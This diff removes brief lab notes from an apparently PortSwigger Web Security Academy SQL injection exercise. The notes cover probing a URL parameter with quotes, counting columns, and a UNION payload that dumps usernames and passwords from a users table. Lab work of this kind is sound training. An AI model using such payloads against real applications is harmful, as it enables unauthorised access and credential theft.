@@ -1,9 +1,0 @@
-try ' in the URL with filter function:
-https://0aaa009d03dad41e81e1f2b800d70015.web-security-academy.net/filter?category=Gifts'
-get an error 
-try '':
-https://0aaa009d03dad41e81e1f2b800d70015.web-security-academy.net/filter?category=Gifts''
-the error was removed so we have sqli
-Find number of Columns via our script `NumberOfColumns.py` the number of colums is 2
-To dump the users data use : `' UNION select NULL, username || '*' || password from users--`
-Or via our script `DataRetrieving2.py`
